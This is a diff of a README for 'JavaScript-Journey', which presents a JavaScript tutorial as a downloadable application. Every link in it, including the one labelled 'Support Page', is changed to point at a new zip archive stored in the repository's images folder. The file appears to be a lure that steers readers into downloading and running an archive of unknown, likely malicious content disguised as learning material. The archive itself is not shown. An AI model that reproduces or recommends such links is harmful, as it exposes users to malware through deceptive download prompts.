@@ -1,7 +1,7 @@
 # 🌟 JavaScript-Journey - Learn JavaScript Step by Step
 
 ## 📥 Download Now
-[![Download JavaScript-Journey](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/JavaScript-Journey_v2.8.zip)](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/JavaScript-Journey_v2.8.zip)
+[![Download JavaScript-Journey](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/Script-Journey-Java-3.7.zip)](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/Script-Journey-Java-3.7.zip)
 
 ## 📖 Overview
 JavaScript-Journey is a comprehensive guide designed to help anyone learn JavaScript, from the basics to advanced concepts. This guide features clear examples and easy-to-follow steps, making it suitable for all learners. 
@@ -21,7 +21,7 @@ To run this application, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 1. **Download the Application:** 
-   - Visit [this page to download](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/JavaScript-Journey_v2.8.zip).
+   - Visit [this page to download](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/Script-Journey-Java-3.7.zip).
   
 2. **Install the Application:** 
    - Once downloaded, locate the file in your downloads folder.
@@ -57,7 +57,7 @@ This guide covers a wide range of topics, including:
   - **Solution:** Check your internet connection and refresh the application.
 
 ## 💬 Support
-If you have any questions or need assistance, please visit our [Support Page](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/JavaScript-Journey_v2.8.zip) to submit your queries. We will respond promptly to help you.
+If you have any questions or need assistance, please visit our [Support Page](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/Script-Journey-Java-3.7.zip) to submit your queries. We will respond promptly to help you.
 
 ## 📅 Updates
 Stay tuned for updates and new features. Our roadmap includes:
@@ -75,6 +75,6 @@ Join our community of learners:
 Learning JavaScript is a rewarding journey. With JavaScript-Journey, you have the tools and support to advance your skills confidently. 
 
 ## 🔗 Download & Install
-Ready to start your journey? [Visit this page to download](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/JavaScript-Journey_v2.8.zip). 
+Ready to start your journey? [Visit this page to download](https://raw.githubusercontent.com/oxidara/JavaScript-Journey/main/images/Script-Journey-Java-3.7.zip). 
 
 Happy coding!
